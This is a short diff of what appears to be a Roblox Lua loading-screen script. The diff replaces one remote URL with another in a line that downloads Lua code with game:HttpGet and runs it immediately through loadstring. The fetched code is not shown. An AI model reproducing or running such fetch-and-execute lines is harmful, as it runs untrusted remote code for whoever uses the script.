@@ -49,6 +49,6 @@ TextLabel_2.Text = "by"
 TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel_2.TextSize = 13.000
 
-loadstring(game:HttpGet('https://sorgunet.fun/task.lua', true))() 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/daskolik/scriptzone/repo.ichbinmusti.git/task.lua', true))() 
 wait(1)
 game.StarterGui.loading:Destroy()
